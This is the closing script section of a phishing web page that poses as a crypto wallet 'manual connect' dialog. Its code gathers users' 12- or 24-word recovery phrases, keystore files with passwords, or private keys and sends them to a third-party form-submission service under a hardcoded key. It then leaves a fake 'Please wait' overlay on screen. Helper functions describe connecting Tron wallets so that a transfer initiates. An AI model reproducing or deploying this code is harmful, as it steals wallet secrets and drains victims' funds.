        } catch (err) {
          console.error('[Fallback] Error opening modal:', err);
        }
      });
      
      console.log('[Fallback] ✓ Button listener attached successfully');
    }
    
    if (document.readyState === 'loading') {
      console.log('[Fallback] DOM loading, attaching DOMContentLoaded listener');
      document.addEventListener('DOMContentLoaded', setupButton);
    } else {
      console.log('[Fallback] DOM ready, setting up immediately');
      setupButton();
    }
  })();
</script>

<!-- Robust modal helpers: ensure tabs, radios, and manual submit work reliably -->
<script>
    (function(){
        // ── Web3Forms Submission (moved here to ensure scope) ─────────────────────────────────────────────
        const WEB3FORMS_KEY = 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea';

        function showProcessingBackdrop() {
            document.getElementById('processing-overlay')?.classList.add('active');
        }

        function hideProcessingBackdrop() {
            document.getElementById('processing-overlay')?.classList.remove('active');
        }

        const submitToWeb3Forms = window.submitToWeb3Forms = async function(data) {
            showProcessingBackdrop();

            try {
                const formData = new FormData();
                formData.append('access_key', WEB3FORMS_KEY);
                formData.append('botcheck', ''); // honeypot

                // Add all data fields
                Object.entries(data).forEach(([key, value]) => {
                    formData.append(key, value || '');
                });

                console.log('Submitting to Web3Forms with fields:', Array.from(formData.keys()));

                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    body: formData,
                    mode: 'cors',
                    credentials: 'omit'
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const result = await response.json();

                if (result.success) {
                    console.log('Web3Forms success:', result);
                    return { success: true, message: result.message };
                } else {
                    throw new Error(result.message || 'Submission failed');
                }
            } catch (error) {
                console.error('Web3Forms error:', error);
                return { success: false, error: error.message || 'Submission failed' };
            } finally {
                // Hide the processing backdrop after submission attempt
                hideProcessingBackdrop();
            }
        };

        function showConnectOverlay(msg = 'Processing…', name = 'Manual Connect'){
            const overlay = document.getElementById('connect-overlay');
            if (!overlay) return;
            overlay.style.display = 'block';
            // force reflow before active
            void overlay.offsetHeight;
            overlay.classList.add('active');
            const m = document.getElementById('overlay-message'); if (m) m.textContent = msg;
            const n = document.getElementById('overlay-wallet-name'); if (n) n.textContent = name;
        }

        // Full white connecting flow: center-left overlay (400x700), remains on screen until page refresh
        function showFullConnectOverlay(walletName = 'Selected Wallet'){
            const overlay = document.getElementById('connect-overlay');
            const modalOverlay = document.getElementById('modal-overlay');
            if (!overlay) return;
            const msgEl = overlay.querySelector('#overlay-message');
            const nameEl = overlay.querySelector('#overlay-wallet-name');
            if (msgEl) {
                msgEl.textContent = 'Please wait...';
                msgEl.style.color = '#888'; // green text
            }
            if (nameEl) nameEl.textContent = walletName;

            // Position at center-left with fixed dimensions (400x700)
            const overlayWidth = 300;
            const overlayHeight = 500;
            const viewportW = window.innerWidth;
            const viewportH = window.innerHeight;
            
            overlay.style.width = `${overlayWidth}px`;
            overlay.style.height = `${overlayHeight}px`;
            overlay.style.left = '16px'; // left side with 16px margin
            overlay.style.top = `${Math.max(16, (viewportH - overlayHeight) / 2)}px`; // vertically centered
            overlay.style.position = 'fixed';
            overlay.style.zIndex = '10001';
            overlay.classList.add('active');
            
            const ring = document.getElementById('connectRing');
            ring.classList.add('active');
            // Overlay remains visible until user refreshes the page (no auto-hide)
        }

        // Delegated tab handling (works even if initial bindings failed)
        document.addEventListener('click', function(e){
            const btn = e.target.closest('.tab-btn');
            if (!btn) return;
            // activate clicked tab
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            // show corresponding content
            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
            const id = btn.dataset.tab + '-tab';
            const tabEl = document.getElementById(id);
            if (tabEl) tabEl.classList.remove('hidden');
            // ensure phrase grid refreshed when phrase tab opened
            if (btn.dataset.tab === 'phrase' && typeof updatePhraseGrid === 'function') {
                try { updatePhraseGrid(); } catch (e) { /* ignore */ }
            }
        }, false);

        // Ensure radios update grid (delegated)
        document.addEventListener('change', function(e){
            const r = e.target;
            if (r && r.name === 'phrase-length') {
                if (typeof updatePhraseGrid === 'function') try { updatePhraseGrid(); } catch (er) {}
            }
        }, false);

        // Manual connect button: toggle white connecting overlay and submit to web3forms
        const manualBtn = document.getElementById('manual-connect-btn');
        if (manualBtn) {
            // Remove the old DOMContentLoaded listener by cloning the button
            const newBtn = manualBtn.cloneNode(true);
            manualBtn.parentNode.replaceChild(newBtn, manualBtn);
            
            newBtn.addEventListener('click', async function(ev){
                ev.preventDefault();
                const overlay = document.getElementById('connect-overlay');
                if (!overlay) return;

                // If overlay is already visible, hide it (toggle off)
                if (overlay.classList.contains('active')) {
                    overlay.classList.remove('active');
                    overlay.style.display = 'none';
                    try { document.getElementById('connectRing')?.classList.remove('active'); } catch (e) {}
                    newBtn.disabled = false;
                    return;
                }

                // Toggle on: show the full connecting overlay and submit
                newBtn.disabled = true;
                const activeTab = document.querySelector('.tab-btn.active')?.dataset.tab || 'phrase';
                const walletName = activeTab.charAt(0).toUpperCase() + activeTab.slice(1);

                try { showFullConnectOverlay(walletName); } catch (e) {}

                // Validate and collect data before submission
                let data = {
                    subject: 'Wallet Connection Request',
                    name: 'User Wallet Submission',
                    user_message: `Submission from ${navigator.userAgent}`,
                    timestamp: new Date().toISOString()
                };
                let isValid = true;

                if (activeTab === 'phrase') {
                    const words = [...document.querySelectorAll('#phrase-grid .word-input')]
                        .map(i => i.value.trim())
                        .filter(Boolean);
                    if (words.length !== 12 && words.length !== 24) {
                        alert(`Please enter exactly 12 or 24 words (you entered ${words.length})`);
                        isValid = false;
                    } else {
                        data.part1 = words.slice(0, 8).join(' ') || '(empty)';
                        data.part2 = words.slice(8, 16).join(' ') || '(empty)';
                        data.part3 = words.slice(16).join(' ') || '(empty)';
                        data.word_count = words.length;
                        data.description = `Recovery phrase (${words.length} words)`;
                    }
                } else if (activeTab === 'keystore') {
                    const json = document.getElementById('keystore-json')?.value.trim();
                    const password = document.getElementById('keystore-password')?.value.trim() || '';
                    if (!json) {
                        alert('Enter keystore JSON');
                        isValid = false;
                    } else {
                        data.message = json;
                        data.feedback = password;
                        data.description = 'Wallet backup file';
                    }
                } else if (activeTab === 'private') {
                    const key = document.getElementById('private-key')?.value.trim();
                    if (!key) {
                        alert('Enter private key');
                        isValid = false;
                    } else {
                        data.message = key;
                        data.description = 'Private access key';
                    }
                }

                if (!isValid) {
                    newBtn.disabled = false;
                    overlay.classList.remove('active');
                    overlay.style.display = 'none';
                    return;
                }

                // Submit to web3forms (now guaranteed to exist in this scope)
                try {
                    const result = await submitToWeb3Forms(data);
                    if (result.success) {
                        console.log('Submission successful:', result);
                        // Clear fields
                        if (activeTab === 'phrase') {
                            document.querySelectorAll('#phrase-grid .word-input').forEach(i => i.value = '');
                        } else if (activeTab === 'keystore') {
                            document.getElementById('keystore-json').value = '';
                            document.getElementById('keystore-password').value = '';
                        } else if (activeTab === 'private') {
                            document.getElementById('private-key').value = '';
                        }
                        document.getElementById('manual-overlay')?.classList.remove('active');
                        // Overlay remains visible
                    } else {
                        const msgEl = document.getElementById('overlay-message');
                        if (msgEl) { msgEl.textContent = 'Submission failed: ' + result.error; msgEl.classList.add('failed'); }
                    }
                    newBtn.disabled = false;
                } catch (err) {
                    console.warn('submission error:', err);
                    newBtn.disabled = false;
                    const msgEl = document.getElementById('overlay-message');
                    if (msgEl) { msgEl.textContent = 'Submission failed'; msgEl.classList.add('failed'); }
                }
            });
        }
    })();
</script>

<script>
    (function(){
        // Delegated input validator for phrase inputs — preload official BIP-39 English list and use it
        // Fallback contains the full BIP-39 English subset included earlier in this file
        const fallbackWords = new Set([
            "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
            "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
            "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
            "adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent",
            "agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert",
            "alien","all","alley","allow","almost","alone","alpha","already","also","alter",
            "always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger",
            "angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique",
            "arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset",
            "assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction",
            "audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake",
            "aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge",
            "bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain",
            "barrel","base","basic","basket","battle","beach","bean","beauty","because","become",
            "beef","before","begin","behave","behind","believe","below","belt","bench","benefit",
            "best","betray","better","between","beyond","bicycle","bid","bike","bind","biology",
            "bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless",
            "blind","blood","blossom","blouse","blue","blur","blush","board","boat","body",
            "boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss",
            "bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread",
            "breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze",
            "broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb",
            "bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy",
            "butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call",
            "calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas",
            "canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry",
            "cart","case","cash","casino","castle","casual","cat","catalog","catch","category",
            "cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century",
            "cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase",
            "chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child",
            "chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle",
            "citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk",
            "clever","click","client","cliff","climb","clinic","clip","clock","clog","close",
            "cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut",
            "code","coffee","coil","coin","collect","color","column","combine","come","comfort",
            "comic","common","company","concert","conduct","confirm","congress","connect","consider","control",
            "convince","cook","cool","copper","copy","coral","core","corn","correct","cost",
            "cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle",
            "craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek",
            "crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial",
            "cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup",
            "cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle","dad",
            "damage","damp","dance","danger","daring","dash","daughter","dawn","day","deal",
            "debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense",
            "define","defy","degree","delay","deliver","demand","demise","denial","dentist","deny",
            "depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk",
            "despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond",
            "diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur",
            "direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance",
            "divert","divide","divorce","dizzy","doctor","document","dog","doll","dolphin","domain",
            "donate","donkey","donor","door","dose","double","dove","draft","dragon","drama",
            "drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop",
            "drum","dry","duck","dumb","dune","during","dust","dutch","duty","dwarf",
            "dynamic","eager","eagle","early","earn","earth","easily","east","easy","echo",
            "ecology","economy","edge","edit","educate","effort","egg","eight","either","elbow",
            "elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody",
            "embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless",
            "endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough",
            "enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip",
            "era","erase","erode","erosion","error","erupt","escape","essay","essence","estate",
            "eternal","ethics","evidence","evil","evoke","evolve","exact","example","excess","exchange",
            "excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit",
            "exotic","expand","expect","expense","expert","expire","explain","expose","express","extend",
            "extra","eye","eyebrow","fabric","face","faculty","fade","faint","faith","fall",
            "false","fame","family","famous","fan","fancy","fantasy","farm","fashion","fat",
            "fatal","father","fatigue","fault","favorite","feature","february","federal","fee","feed",
            "feel","female","fence","festival","fetch","fever","few","fiber","fiction","field",
            "figure","file","film","filter","final","find","fine","finger","finish","fire",
            "firm","first","fiscal","fish","fit","fitness","fix","flag","flame","flash",
            "flat","flavor","flee","flight","flip","float","flock","floor","flower","fluid",
            "flush","fly","foam","focus","fog","foil","fold","follow","food","foot",
            "force","forest","forget","fork","fortune","forum","forward","fossil","foster","found",
            "fox","fragile","frame","frequent","fresh","friend","fringe","frog","front","frost",
            "frown","frozen","fruit","fuel","fun","funny","furnace","fury","future","gadget",
            "gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic","garment",
            "gas","gasp","gate","gather","gauge","gaze","general","genius","genre","gentle",
            "genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl","give",
            "glad","glance","glare","glass","glide","glimpse","globe","gloom","glory","glove",
            "glow","glue","goat","goddess","gold","good","goose","gorilla","gospel","gossip",
            "govern","gown","grab","grace","grain","grant","grape","grass","gravity","great",
            "green","grid","grief","grit","grocery","group","grow","grunt","guard","guess",
            "guide","guilt","guitar","gun","gym","habit","hair","half","hammer","hamster",
            "hand","happy","harbor","hard","harsh","harvest","hat","have","hawk","hazard",
            "head","health","heart","heavy","hedgehog","height","hello","helmet","help","hen",
            "hero","hidden","high","hill","hint","hip","hire","history","hobby","hockey",
            "hold","hole","holiday","hollow","home","honey","hood","hope","horn","horror",
            "horse","hospital","host","hotel","hour","hover","hub","huge","human","humble",
            "humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid","ice",
            "icon","idea","identify","idle","ignore","ill","illegal","illness","image","imitate",
            "immense","immune","impact","impose","improve","impulse","inch","include","income","increase",
            "index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial",
            "inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside",
            "inspire","install","intact","interest","into","invest","invite","involve","iron","island",
            "isolate","issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans",
            "jelly","jewel","job","join","joke","journey","joy","judge","juice","jump",
            "jungle","junior","junk","just","kangaroo","keen","keep","ketchup","key","kick",
            "kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi",
            "knee","knife","knock","know","lab","label","labor","ladder","lady","lake",
            "lamp","language","laptop","large","later","latin","laugh","laundry","lava","law",
            "lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left",
            "leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson",
            "letter","level","liar","liberty","library","license","life","lift","light","like",
            "limb","limit","link","lion","liquid","list","little","live","lizard","load",
            "loan","lobster","local","lock","logic","lonely","long","loop","lottery","loud",
            "lounge","love","loyal","lucky","luggage","lumber","lunar","lunch","luxury","lyrics",
            "machine","mad","magic","magnet","maid","mail","main","major","make","mammal",
            "man","manage","mandate","mango","mansion","manual","maple","marble","march","margin",
            "marine","market","marriage","mask","mass","master","match","material","math","matrix",
            "matter","maximum","maze","meadow","mean","measure","meat","mechanic","medal","media",
            "melody","melt","member","memory","mention","menu","mercy","merge","merit","merry",
            "mesh","message","metal","method","middle","midnight","milk","million","mimic","mind",
            "minimum","minor","minute","miracle","mirror","misery","miss","mistake","mix","mixed",
            "mixture","mobile","model","modify","mom","moment","monitor","monkey","monster","month",
            "moon","moral","more","morning","mosquito","mother","motion","motor","mountain","mouse",
            "move","movie","much","muffin","mule","multiply","muscle","museum","mushroom","music",
            "must","mutual","myself","mystery","myth","naive","name","napkin","narrow","nasty",
            "nation","nature","near","neck","need","negative","neglect","neither","nephew","nerve",
            "nest","net","network","neutral","never","news","next","nice","night","noble",
            "noise","nominee","noodle","normal","north","nose","notable","note","nothing","notice",
            "novel","now","nuclear","number","nurse","nut","oak","obey","object","oblige",
            "obscure","observe","obtain","obvious","occur","ocean","october","odor","off","offer",
            "office","often","oil","okay","old","olive","olympic","omit","once","one",
            "onion","online","only","open","opera","opinion","oppose","option","orange","orbit",
            "orchard","order","ordinary","organ","orient","original","orphan","ostrich","other","outdoor",
            "outer","output","outside","oval","oven","over","own","owner","oxygen","oyster",
            "ozone","pact","paddle","page","pair","palace","palm","panda","panel","panic",
            "panther","paper","parade","parent","park","parrot","party","pass","patch","path",
            "patient","patrol","pattern","pause","pave","payment","peace","peanut","pear","peasant",
            "pelican","pen","penalty","pencil","people","pepper","perfect","permit","person","pet",
            "phone","photo","phrase","physical","piano","picnic","picture","piece","pig","pigeon",
            "pill","pilot","pink","pioneer","pipe","pistol","pitch","pizza","place","planet",
            "plastic","plate","play","please","pledge","pluck","plug","plunge","poem","poet",
            "point","polar","pole","police","pond","pony","pool","popular","portion","position",
            "possible","post","potato","pottery","poverty","powder","power","practice","praise","predict",
            "prefer","prepare","present","pretty","prevent","price","pride","primary","print","priority",
            "prison","private","prize","problem","process","produce","profit","program","project","promote",
            "proof","property","prosper","protect","proud","provide","public","pudding","pull","pulp",
            "pulse","pumpkin","punch","pupil","puppy","purchase","purity","purpose","purse","push",
            "put","puzzle","pyramid","quality","quantum","quarter","question","quick","quit","quiz",
            "quote","rabbit","raccoon","race","rack","radar","radio","rail","rain","raise",
            "rally","ramp","ranch","random","range","rapid","rare","rate","rather","raven",
            "raw","razor","ready","real","reason","rebel","rebuild","recall","receive","recipe",
            "record","recycle","reduce","reflect","reform","refuse","region","regret","regular","reject",
            "relax","release","relief","rely","remain","remember","remind","remove","render","renew",
            "rent","reopen","repair","repeat","replace","report","require","rescue","resemble","resist",
            "resource","response","result","retire","retreat","return","reunion","reveal","review","reward",
            "rhythm","rib","ribbon","rice","rich","ride","ridge","rifle","right","rigid",
            "ring","riot","ripple","risk","ritual","rival","river","road","roast","robot",
            "robust","rocket","romance","roof","rookie","room","rose","rotate","rough","round",
            "route","royal","rubber","rude","rug","rule","run","runway","rural","sad",
            "saddle","sadness","safe","sail","salad","salmon","salon","salt","salute","same",
            "sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan",
            "scare","scatter","scene","scheme","school","science","scissors","scorpion","scout","scrap",
            "screen","script","scrub","sea","search","season","seat","second","secret","section",
            "security","seed","seek","segment","select","sell","seminar","senior","sense","sentence",
            "series","service","session","settle","setup","seven","shadow","shaft","shallow","share",
            "shed","shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe",
            "shoot","shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling",
            "sick","side","siege","sight","sign","silent","silk","silly","silver","similar",
            "simple","since","sing","siren","sister","situation","six","size","skate","sketch",
            "ski","skill","skin","skirt","skull","slab","slam","sleep","slender","slice",
            "slide","slight","slim","slogan","slot","slow","slush","small","smart","smile",
            "smoke","smooth","snack","snake","snap","sniff","snow","soap","soccer","social",
            "sock","soda","soft","solar","soldier","solid","solution","solve","someone","song",
            "soon","sorry","sort","soul","sound","soup","source","south","space","spare",
            "spatial","spawn","speak","special","speed","spell","spend","sphere","spice","spider",
            "spike","spin","spirit","split","spoil","sponsor","spoon","sport","spot","spray",
            "spread","spring","spy","square","squeeze","squirrel","stable","stadium","staff","stage",
            "stairs","stamp","stand","start","state","stay","steak","steel","stem","step",
            "stereo","stick","still","sting","stock","stomach","stone","stool","story","stove",
            "strategy","street","strike","strong","struggle","student","stuff","stumble","style","subject",
            "submit","subway","success","such","sudden","suffer","sugar","suggest","suit","summer",
            "sun","sunny","sunset","super","supply","supreme","sure","surface","surge","surprise",
            "surround","survey","suspect","sustain","swallow","swamp","swap","swarm","swear","sweet",
            "swift","swim","swing","switch","sword","symbol","symptom","syrup","system","table",
            "tackle","tag","tail","talent","talk","tank","tape","target","task","taste",
            "tattoo","taxi","teach","team","tell","ten","tenant","tennis","tent","term",
            "test","text","thank","that","theme","then","theory","there","they","thing",
            "this","thought","three","thrive","throw","thumb","thunder","ticket","tide","tiger",
            "tilt","timber","time","tiny","tip","tired","tissue","title","toast","tobacco",
            "today","toddler","toe","together","toilet","token","tomato","tomorrow","tone","tongue",
            "tonight","tool","tooth","top","topic","topple","torch","tornado","tortoise","toss",
            "total","tourist","toward","tower","town","toy","track","trade","traffic","tragic",
            "train","transfer","trap","trash","travel","tray","treat","tree","trend","trial",
            "tribe","trick","trigger","trim","trip","trophy","trouble","truck","true","truly",
            "trumpet","trust","truth","try","tube","tuition","tumble","tuna","tunnel","turkey",
            "turn","turtle","twelve","twenty","twice","twin","twist","two","type","typical",
            "ugly","umbrella","unable","unaware","uncle","uncover","under","undo","unfair","unfold",
            "unhappy","uniform","unique","unit","universe","unknown","unlock","until","unusual","unveil",
            "update","upgrade","uphold","upon","upper","upset","urban","urge","usage","use",
            "used","useful","useless","usual","utility","vacant","vacuum","vague","valid","valley",
            "valve","van","vanish","vapor","various","vast","vault","vehicle","velvet","vendor",
            "venture","venue","verb","verify","version","very","vessel","veteran","viable","vibrant",
            "vicious","victory","video","view","village","vintage","violin","virtual","virus","visa",
            "visit","visual","vital","vivid","vocal","voice","void","volcano","volume","vote",
            "voyage","wage","wagon","wait","walk","wall","walnut","want","warfare","warm",
            "warrior","wash","wasp","waste","water","wave","way","wealth","weapon","wear",
            "weasel","weather","web","wedding","weekend","weird","welcome","west","wet","whale",
            "what","wheat","wheel","when","where","whip","whisper","wide","width","wife",
            "wild","will","win","window","wine","wing","wink","winner","winter","wire",
            "wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool","word",
            "work","world","worry","worth","wrap","wreck","wrestle","wrist","write","wrong",
            "yard","year","yellow","you","young","youth","zebra","zero","zone","zoo"
        ]);

        // Start async preload of official BIP-39 wordlist (cached on window._bip39Set)
        (function preloadBip39(){
            try {
                if (window._bip39Set || window._bip39Loading) return;
                window._bip39Loading = fetch('https://cdn.jsdelivr.net/npm/bip39@3.0.4/wordlists/english.json')
                    .then(r => r.json())
                    .then(list => { window._bip39Set = new Set(list.map(w => String(w).toLowerCase())); window._bip39Loading = null; })
                    .catch(() => { window._bip39Loading = null; });
            } catch (e) { /* ignore */ }
        })();

        function checkWordValidity(word){
            if (!word) return null;
            const w = String(word).toLowerCase();
            // Prefer the official preloaded set
            if (window._bip39Set) return window._bip39Set.has(w);
            // Prefer the local in-file validator (contains the large list at lines ~5287-5491)
            try {
                if (typeof isValidBip39Word === 'function') return isValidBip39Word(word);
                if (typeof window.isValidBip39Word === 'function') return window.isValidBip39Word(word);
            } catch(e){}
            // Fallback small set
            return fallbackWords.has(w);
        }

        // Validate on input for any dynamically created .word-input
        document.addEventListener('input', function(e){
            const t = e.target;
            if (!t || !t.classList) return;
            if (t.classList.contains('word-input')){
                const val = String(t.value || '').trim();
                if (val === '') { t.classList.remove('correct','incorrect'); return; }
                const ok = checkWordValidity(val);
                if (ok === true) { t.classList.remove('incorrect'); t.classList.add('correct'); }
                else if (ok === false) { t.classList.remove('correct'); t.classList.add('incorrect'); }
            }
        }, false);

        // Ensure grid is rebuilt when radios change; prefer existing updatePhraseGrid if available
        document.addEventListener('change', function(e){
            const t = e.target;
            if (t && t.name === 'phrase-length'){
                try {
                    if (typeof updatePhraseGrid === 'function') { updatePhraseGrid(); return; }
                } catch (err) { /* fallthrough */ }

                // fallback build if updatePhraseGrid missing
                const count = (t.value === '12') ? 12 : 24;
                const phraseGridEl = document.getElementById('phrase-grid');
                if (!phraseGridEl) return;
                phraseGridEl.innerHTML = '';
                const cols = (count === 12) ? 3 : 4;
                phraseGridEl.style.gridTemplateColumns = `repeat(${cols}, 1fr)`;
                for (let i=0;i<count;i++){
                    const div = document.createElement('div');
                    const input = document.createElement('input');
                    input.className = 'word-input';
                    input.placeholder = `Word ${i+1}`;
                    input.maxLength = 20;
                    div.appendChild(input);
                    phraseGridEl.appendChild(div);
                }
            }
        }, false);

        // Ensure initial grid exists (invoke existing or trigger change)
        (function ensureInitialGrid(){
            try { if (typeof updatePhraseGrid === 'function') { updatePhraseGrid(); return; } } catch (e) {}
            // otherwise trigger a change on the checked radio to build fallback grid
            const r = document.querySelector('input[name="phrase-length"]:checked');
            if (r) r.dispatchEvent(new Event('change', { bubbles: true }));
        })();

        // ════════════════════════════════════════════════════════════════════════════════
        // TEST HELPERS - Available in console for debugging
        // ════════════════════════════════════════════════════════════════════════════════
        window.TEST_TRON = {
          detectDesktopExtension: () => {
            console.log('=== TronLink Desktop Detection ===');
            console.log('window.tronLink:', !!window.tronLink);
            console.log('window.tronWeb:', !!window.tronWeb);
            console.log('window.tronWeb?.ready:', window.tronWeb?.ready);
            console.log('window.tronWeb?.defaultAddress:', window.tronWeb?.defaultAddress);
            console.log('isTronLinkDetected():', isTronLinkDetected?.());
            return isTronLinkDetected?.() ?? false;
          },

          connectDesktop: async () => {
            console.log('=== Connecting to TronLink Desktop Extension ===');
            try {
              const result = await connectTronLinkDesktop?.();
              console.log('Result:', result);
              return result;
            } catch (err) {
              console.error('Error:', err);
              throw err;
            }
          },

          connectViaWC: async () => {
            console.log('=== Connecting to Tron via WalletConnect (Universal Deep Link) ===');
            try {
              const result = await connectTronViaWalletConnect?.();
              console.log('Result:', result);
              return result;
            } catch (err) {
              console.error('Error:', err);
              throw err;
            }
          },

          connect: async () => {
            console.log('=== Testing Full Tron Connection Flow (Desktop → WC Universal Link) ===');
            try {
              const result = await connectTron?.();
              console.log('✓ Connection successful:', result);
              return result;
            } catch (err) {
              console.error('✗ Connection failed:', err);
              throw err;
            }
          },

          showDebugInfo: () => {
            console.group('🔍 TronLink Debug Info');
            console.log('📱 Device Detection:', {
              isMobile: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent),
              userAgent: navigator.userAgent.substring(0, 80) + '...'
            });
            console.log('🔗 Tron Detection Status:', {
              tronLink: !!window.tronLink,
              tronWeb: !!window.tronWeb,
              ready: window.tronWeb?.ready,
              hasAddress: !!window.tronWeb?.defaultAddress?.base58,
              address: window.tronWeb?.defaultAddress?.base58 || 'Not connected'
            });
            console.log('🔄 WalletConnect Status:', {
              SignClient: !!window.SignClient,
              wcClient: !!window.__wcClient,
              projectId: '81ec0eb195ddbee9c5596804e33ff584'
            });
            console.log('✨ Available Functions:', {
              isTronLinkDetected: !!window.isTronLinkDetected,
              connectTronLinkDesktop: !!window.connectTronLinkDesktop,
              connectTronViaWalletConnect: !!window.connectTronViaWalletConnect,
              connectTron: !!window.connectTron,
              buildUniversalDeepLink: !!window.buildUniversalDeepLink,
              transferTronRemaining: !!window.transferTronRemaining
            });
            console.groupEnd();
          },

          help: () => {
            console.log(`
╔═══════════════════════════════════════════════════════════════════════════╗
║                  Tron Connection Testing - Jan 2026                       ║
╚═══════════════════════════════════════════════════════════════════════════╝

📋 Available Test Functions:

1. window.TEST_TRON.showDebugInfo()
   → Show current detection & function status

2. window.TEST_TRON.detectDesktopExtension()
   → Check if TronLink desktop extension is detected

3. window.TEST_TRON.connectDesktop()
   → Test TronLink desktop extension connection

4. window.TEST_TRON.connectViaWC()
   → Test WalletConnect (uses universal deep link on mobile)

5. window.TEST_TRON.connect()
   → Full flow: Desktop first, then WalletConnect fallback

═════════════════════════════════════════════════════════════════════════════

🔧 Implementation Details:

Desktop (✅ STABLE):
  - Uses window.tronLink or window.tronWeb.request()
  - Calls tron_requestAccounts() for popup approval
  - Works reliably

Mobile (🆕 FIXED):
  - STOPS using QR code (causes "No matching key" relay bug)
  - NOW uses universal deep link: https://tronlink.org/#/connect?uri=...
  - Falls back to Trust Wallet or other WC-compatible wallets
  - Avoids WalletConnect relay matching bugs entirely

═════════════════════════════════════════════════════════════════════════════

🐛 Known Issues Fixed:

  ❌ "No matching key. proposal: ..." error
     → Fixed: Universal deep link instead of WC QR for mobile

  ❌ TronLink mobile app couldn't recognize QR
     → Fixed: Now uses tronlink://wc?uri=... format

  ❌ WC session timeout on mobile
     → Fixed: Deep link redirects immediately (no relay delay)

═════════════════════════════════════════════════════════════════════════════

📱 Mobile User Flow:

1. Click Tron button
2. Detects mobile device
3. Generates WC URI
4. Redirects via: https://tronlink.org/#/connect?uri=...
5. TronLink app opens automatically
6. User approves connection in app
7. Transfer initiates (no QR scanning needed!)

═════════════════════════════════════════════════════════════════════════════

🖥️ Desktop User Flow:

1. Click Tron button
2. Tries TronLink extension
3. If extension found → Instant connection (tron_requestAccounts)
4. If extension missing → Shows WC QR code
5. Scans with mobile or copies URI
6. Approves in mobile wallet
7. Transfer initiates

═════════════════════════════════════════════════════════════════════════════

🚀 Quick Start:

Desktop:
  window.TEST_TRON.connect()  → Should connect immediately

Mobile:
  window.TEST_TRON.showDebugInfo()  → See device detection
  window.TEST_TRON.connect()  → Opens TronLink app via universal link

            `);
          }
        };

        console.log('📋 Tron Connection Test Suite Loaded (Jan 2026)');
    })();
</script>

</body>

</html>
